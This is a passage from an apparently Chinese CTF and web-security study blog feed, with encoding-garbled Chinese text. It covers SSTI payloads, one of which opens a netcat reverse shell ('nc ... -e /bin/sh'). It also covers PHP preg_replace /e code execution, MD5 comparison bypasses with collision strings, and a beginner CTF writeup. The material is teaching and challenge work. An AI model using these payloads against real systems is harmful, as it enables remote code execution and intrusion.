config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;&#x2F;&#x2F;åŠ è½½system&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;&#x2F;&#x2F;æ‰§è¡Œå‘½ä»¤åå¼¹SHELL</code></pre><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:port&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_replaceä¸ä»£ç æ‰§è¡Œ</title>
      <link href="article/preg_replace/"/>
      <url>article/preg_replace/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« é“¾æ¥ï¼š <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p><a id="more"></a><h1 id="preg-replaceä¸ä»£ç æ‰§è¡Œ"><a href="#preg-replaceä¸ä»£ç æ‰§è¡Œ" class="headerlink" title="preg_replaceä¸ä»£ç æ‰§è¡Œ"></a>preg_replaceä¸ä»£ç æ‰§è¡Œ</h1><p> <strong>preg_replace</strong> <strong>/e</strong> æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œé—®é¢˜ </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">')/ei'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p> <strong>preg_replace</strong> ä½¿ç”¨äº† <strong>/e</strong> æ¨¡å¼ï¼Œå¯¼è‡´å¯ä»¥ä»£ç æ‰§è¡Œï¼Œè€Œä¸”è¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚ </p><p> <strong>preg_replace</strong> å‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†æ›¿æ¢å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯ä¸Šå›¾ <strong>preg_replace</strong> å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰å½“åšä»£ç æ¥æ‰§è¡Œï¼Œç„¶è€Œè¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å´å›ºå®šä¸º <strong>â€˜strtolower(â€œ\1â€)â€™</strong> å­—ç¬¦ä¸².</p><p>ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œï¼Œç›¸å½“äº <strong>eval(â€˜strtolower(â€œ\1â€);â€™)</strong> ç»“æœï¼Œå½“ä¸­çš„ <strong>\1</strong> å®é™…ä¸Šå°±æ˜¯ <strong>\1</strong> ï¼Œè€Œ <strong>\1</strong> åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ã€‚</p><blockquote><p><strong>åå‘å¼•ç”¨</strong></p><p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ <strong>ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·</strong> å°†å¯¼è‡´ç›¸å…³ <strong>åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº</strong> ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p></blockquote><p> <strong>payload</strong> ä¸ºï¼š <strong>/?.*={${phpinfo()}}</strong> ï¼Œå³ <strong>GET</strong> æ–¹å¼ä¼ å…¥çš„å‚æ•°åä¸º <strong>/?.*</strong> ï¼Œå€¼ä¸º <strong>{${phpinfo()}}</strong> ã€‚ </p><pre class="language-none"><code class="language-none">$re&#x3D;.*$str&#x3D;&#123;$&#123;phpinfo()&#125;&#125;åŸå…ˆçš„è¯­å¥ï¼š preg_replace(&#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $str);å˜æˆäº†è¯­å¥ï¼š preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;phpinfo()&#125;&#125;);</code></pre><hr><p> ç”±äºåœ¨PHPä¸­ï¼Œå¯¹äºä¼ å…¥çš„éæ³•çš„ <strong>$_GET</strong> æ•°ç»„å‚æ•°åï¼Œä¼šå°†å…¶è½¬æ¢æˆä¸‹åˆ’çº¿ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬æ­£åˆ™åŒ¹é…å¤±æ•ˆã€‚ </p><p> å½“éæ³•å­—ç¬¦ä¸ºé¦–å­—æ¯æ—¶ï¼Œåªæœ‰ç‚¹å·ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯æ¢ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè®©å…¶åŒ¹é…åˆ° <strong>{${phpinfo()}}</strong> å³å¯æ‰§è¡Œ <strong>phpinfo</strong> å‡½æ•°ã€‚<strong>payload</strong> ï¼š <strong>\S*=${phpinfo()}</strong> </p><p> ä¸ºä»€ä¹ˆè¦åŒ¹é…åˆ° <strong>{${phpinfo()}}</strong> æˆ–è€… <strong>${phpinfo()}</strong> ï¼Œæ‰èƒ½æ‰§è¡Œ <strong>phpinfo</strong> å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªå°å‘ã€‚è¿™å®é™…ä¸Šæ˜¯ <a href="http://php.net/manual/zh/language.variables.variable.php">PHPå¯å˜å˜é‡</a> çš„åŸå› ã€‚åœ¨PHPä¸­åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ï¼Œè€Œå•å¼•å·åˆ™ä¸è¡Œã€‚ <strong>${phpinfo()}</strong> ä¸­çš„ <strong>phpinfo()</strong> ä¼šè¢«å½“åšå˜é‡å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œåï¼Œå³å˜æˆ <strong>${1}</strong> (phpinfo()æˆåŠŸæ‰§è¡Œè¿”å›true)ã€‚ </p><p>æ–‡ç« é“¾æ¥ï¼š <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5æ¯”è¾ƒ</title>
      <link href="article/md5/"/>
      <url>article/md5/</url>
      
        <content type="html"><![CDATA[<p>MD5å¼±ç±»å‹æ¯”è¾ƒï¼Œå¼ºç±»å‹æ¯”è¾ƒä»¥åŠçœŸå®ç¢°æ’</p><a id="more"></a><h1 id="MD5æ¯”è¾ƒç±»å‹"><a href="#MD5æ¯”è¾ƒç±»å‹" class="headerlink" title="MD5æ¯”è¾ƒç±»å‹"></a>MD5æ¯”è¾ƒç±»å‹</h1><h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¼±ç±»å‹æ¯”è¾ƒå› ä¸ºphpç‰¹æ€§ï¼Œ0eå¼€å¤´ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœ0=0æ¯”è¾ƒæˆåŠŸ</p><p>payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>aabg7XSs</code></pre><p>åªè¦æ˜¯md5å€¼ä¸º0eå¼€å¤´å³å¯</p><hr><h2 id="å¼ºæ¯”è¾ƒç±»å‹"><a href="#å¼ºæ¯”è¾ƒç±»å‹" class="headerlink" title="å¼ºæ¯”è¾ƒç±»å‹"></a>å¼ºæ¯”è¾ƒç±»å‹</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¼ºç±»å‹æ¯”è¾ƒç”¨æ•°ç»„ç»•è¿‡ï¼Œmd5()å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼ï¼Œå°±ä¼šå¾—åˆ°===å¼ºæ¯”è¾ƒå€¼ç›¸ç­‰</p><p>payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">111</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaa</code></pre><p>ä¼ å…¥æ•°ç»„å³å¯</p><hr><h2 id="çœŸå®ç¢°æ’"><a href="#çœŸå®ç¢°æ’" class="headerlink" title="çœŸå®ç¢°æ’"></a>çœŸå®ç¢°æ’</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>çœŸå®md5ç¢°æ’ï¼Œç”±äºstring()å‡½æ•°ï¼Œä¸èƒ½è¾“å…¥æ•°ç»„åªèƒ½è¾“å…¥å­—ç¬¦ä¸²</p><p>payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre><p>å€¼ä¸ç­‰ï¼Œmd5ç›¸ç­‰å³å¯ã€‚md5ç¢°æ’ã€‚</p><hr><h2 id="0eå¼€å¤´MD5çš„MD5ä¸º0eçš„MD5"><a href="#0eå¼€å¤´MD5çš„MD5ä¸º0eçš„MD5" class="headerlink" title="0eå¼€å¤´MD5çš„MD5ä¸º0eçš„MD5"></a>0eå¼€å¤´MD5çš„MD5ä¸º0eçš„MD5</h2><p>0e215962017 </p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>S3cCTF-å‡ºé¢˜äººgyy-Writeup</title>
      <link href="article/S3cCTF-gyy-Writeup/"/>
      <url>article/S3cCTF-gyy-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="S3cCTF-gyy-Writeup"><a href="#S3cCTF-gyy-Writeup" class="headerlink" title="S3cCTF-gyy-Writeup"></a>S3cCTF-gyy-Writeup</h1><p><strong>å‡ºé¢˜äººï¼šgyy</strong></p><p><strong>å†™åœ¨å‰é¢ï¼š</strong></p><p>æœ¬æ¬¡æ‹›æ–°èµ›æˆ‘ä¸»è¦è´Ÿè´£WEBæ–¹é¢çš„å‡ºé¢˜ï¼Œå½“ç„¶å…¼é¡¾ä¸€äº›MISCï¼Œæœ¬ç€ç®€å•æ˜“æ‡‚çš„åŸåˆ™ï¼Œåˆšå¼€å§‹å‡ºäº†å¾ˆå¤šç®€å•WEBé¢˜ï¼Œä½†æ˜¯è¿™å±Šæ–°ç”Ÿçš„å®åŠ›æ˜æ˜¾æ¯”æˆ‘ä»¬å½“æ—¶å¼º= =ï¼ŒåæœŸåˆèµ¶äº†ä¸€äº›æå‡é¢˜ï¼Œå½“ç„¶å’ŒçœŸæ­£çš„CTFæ¯”èµ›è¿˜æ˜¯æœ‰éå¸¸å¤§çš„è·ç¦»ï¼Œä¾‹å¦‚åœ¨ç¾¤é‡Œæ”¾å‡ºçš„å‘¨å…­çš„é¢˜ç›®å¯ä»¥çœ‹å‡ºã€‚æ‰€ä»¥ï¼Œè¿™äº›åªæ˜¯å…¥é—¨CTFçš„åŸºç¡€ï¼Œå»å¹´çš„è¿™æ—¶ï¼Œæˆ‘ä»¬å‚åŠ çš„æ‹›æ–°æ¯”èµ›æ¯”ä»Šå¹´æ›´åŠ å›°éš¾ï¼ˆæ‰€ä»¥ä»Šå¹´æˆ‘æœ‰åŒæ„Ÿåœ°å‡ºäº†ä¸å°‘ç®€å•é¢˜ï¼‰ï¼Œæˆ‘å¸Œæœ›å¤§å®¶ä¸è¦æ­¢æ­¥äºæ­¤ï¼Œå½“åˆæˆ‘ä¹Ÿæœ‰ä¸€è…”çƒ­è¡€ï¼Œè§‰å¾—CTFä¸è¿‡å¦‚æ­¤ï¼ˆç”šè‡³è¿˜æƒ³åŒä¿®ï¼‰ã€‚ä½†ï¼Œèµ°çš„è¶Šé«˜ï¼Œè¶Šä¼šå‘ç°è‡ªå·±è¶Šæ¸ºå°ï¼Œè¿™æ¡é“è·¯å¯èƒ½è¿˜æ²¡æœ‰å°½å¤´ã€‚æŠ€æœ¯å¯ä»¥åæœŸåŸ¹å…»ï¼Œè¿™æ¬¡æ‹›æ–°æ¯”èµ›åˆ†æ•°ä¹Ÿåªèƒ½ä½œä¸ºæ£€æµ‹åŸºç¡€çš„æµ‹è¯•ï¼Œå¦‚æœä½ æœ‰å¼ºçƒˆçš„æ„å‘å’Œå…´è¶£ï¼Œæ¯”æ¯”èµ›æˆç»©æ›´ä¸ºé‡è¦ï¼Œæˆ‘ä»¬æ¬¢è¿ä½ å’Œæˆ‘ä»¬è”ç³»ï¼Œå¸Œæœ›å¤§å®¶ä¸å¿˜åˆå¿ƒï¼Œç ¥ç ºå‰è¡Œã€‚</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="How-to-solve-ctf"><a href="#How-to-solve-ctf" class="headerlink" title="How_to_solve_ctf"></a>How_to_solve_ctf</h2><h3 id="å‡ºé¢˜è§£æ"><a href="#å‡ºé¢˜è§£æ" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>æœ¬é¢˜æ—¨åœ¨æŒ‡å¼•å¤§å®¶ï¼Œè€ƒäº†ä¸€ä¸‹HTMLçš„çŸ¥è¯†</p><h3 id="è§£é¢˜æ–¹å¼"><a href="#è§£é¢˜æ–¹å¼" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>F12æŸ¥çœ‹æºä»£ç ï¼Œç»™äº†æç¤º<code>&lt;!-- htmlå…ƒç´ æ˜¯å¯ä»¥ä¿®æ”¹çš„ --&gt;</code><br>ä¿®æ”¹formè¡¨å•é‡Œinputæ–‡æœ¬æ¡†çš„é•¿åº¦é™åˆ¶ï¼Œæäº¤s3c2020å³å¯è·å¾—flag<br>ç”±äºæ˜¯GETä¼ å‚ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¼ <code>key=s3c2020</code>å³å¯</p><img src="/article/S3cCTF-gyy-Writeup/20201122173122547.png" class="" title="web1" loading="lazy"><hr><h2 id="nof12"><a href="#nof12" class="headerlink" title="nof12"></a>nof12</h2><h3 id="å‡ºé¢˜è§£æ-1"><a href="#å‡ºé¢˜è§£æ-1" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>æœ¬é¢˜åˆ©ç”¨scripté™åˆ¶äº†é¼ æ ‡å³é”®å’Œf12</p><h3 id="è§£é¢˜æ–¹å¼-1"><a href="#è§£é¢˜æ–¹å¼-1" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>ä¸é¢˜ç›® <strong>S3C_NOT_BAD</strong> é‡å¤ï¼ŒCtrl+Uæˆ–è€…burpæŠ“åŒ…æˆ–è€…curlè®¿é—®éƒ½å¯</p><img src="/article/S3cCTF-gyy-Writeup/20201122174018834.png" class="" title="web2" loading="lazy"><hr><h2 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h2><h3 id="å‡ºé¢˜è§£æ-2"><a href="#å‡ºé¢˜è§£æ-2" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>æœ¬é¢˜æ—¨åœ¨è€ƒXFFï¼ˆX-Forwarded-Forï¼‰å’ŒReferer<br>ä¼ªé€ åœ°å€ä¸‰ç§æ–¹å¼ï¼š</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><h3 id="è§£é¢˜æ–¹å¼-2"><a href="#è§£é¢˜æ–¹å¼-2" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>åªæœ‰æœ¬åœ°ç®¡ç†å‘˜æ‰èƒ½è®¿é—®æœ¬é¡µé¢ï¼<br>burpæŠ“åŒ…ä¿®æ”¹å³å¯</p><img src="/article/S3cCTF-gyy-Writeup/20201122174702383.png" class="" title="web3" loading="lazy"><hr><h2 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h2><h3 id="å‡ºé¢˜è§£æ-3"><a href="#å‡ºé¢˜è§£æ-3" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>302é‡å®šå‘</p><pre class="language-php" data-language="php"><code class="language-php">//flag.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Flag: '</span><span class="token punctuation">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s3c&#123;0H_mY_g0d_its_4O4&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä¿®æ”¹ X-Powered-Byä¿¡æ¯</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">//404.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Not Found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- æ‰æ€ª --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http/1.1 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"status: 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>The requested URL /flag.php was not found on this server.&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><h3 id="è§£é¢˜æ–¹å¼-3"><a href="#è§£é¢˜æ–¹å¼-3" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>æ‰“å¼€ç‚¹å‡»åè·³è½¬Not Foundï¼Œä»”ç»†çœ‹å‘ç°ç•Œé¢æ˜¯ä¼ªé€ çš„</p><img src="/article/S3cCTF-gyy-Writeup/20201122175207502.png" class="" width="404" loading="lazy"><p>å› ä¸ºç•Œé¢æ˜¯æˆ‘è‡ªå·±å†™çš„å‡ç•Œé¢ï¼Œç‰¹æ„å†™äº†ä¸ªæ³¨é‡Šï¼Œç”±æ­¤æƒ³åˆ°é‡å®šå‘<br>ç›´æ¥åœ¨headeré‡Œèƒ½çœ‹åˆ°flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175439466.png" class="" title="flag" loading="lazy"><p>æ‹¿å»base64è§£ä¸€ä¸‹å³å¯è·å¾—flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175814189.png" class="" title="base64" loading="lazy"><hr><h2 id="å¿«é€Ÿè®¡ç®—"><a href="#å¿«é€Ÿè®¡ç®—" class="headerlink" title="å¿«é€Ÿè®¡ç®—"></a>å¿«é€Ÿè®¡ç®—</h2><h3 id="å‡ºé¢˜è§£æ-4"><a href="#å‡ºé¢˜è§£æ-4" class="headerlink" 